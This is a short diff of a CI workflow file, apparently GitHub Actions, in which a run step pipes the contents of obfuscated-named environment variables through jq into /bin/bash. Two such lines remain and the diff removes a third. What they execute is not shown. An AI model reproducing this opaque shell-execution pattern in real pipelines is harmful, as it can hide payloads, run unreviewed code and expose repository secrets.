@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$nwno1515" | jq -r .lsrv414 | /bin/bash
           printf '%s' "$ukl1359" | jq -r .qewm44 | /bin/bash
-          echo $kauxu90219 | jq -r .vtwe3 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
